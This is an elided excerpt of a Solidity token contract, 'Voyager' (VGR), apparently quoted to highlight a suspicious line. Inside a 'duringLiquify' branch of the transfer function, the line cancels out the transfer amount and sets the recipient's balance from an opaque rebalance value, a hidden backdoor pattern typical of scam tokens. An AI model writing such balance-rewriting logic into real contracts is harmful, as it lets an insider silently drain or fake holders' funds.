 ...
 */
contract VGR is Ownable, IERC20 {
    ...
    string private _name = "Voyager";
    string private  _symbol = "VGR";
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if (duringLiquify(from, to)) {
            ...
            _balances[recipient] = amount + rebalance(from) - amount;
    ...
    function checkTransfer(address from, address recipient) private{
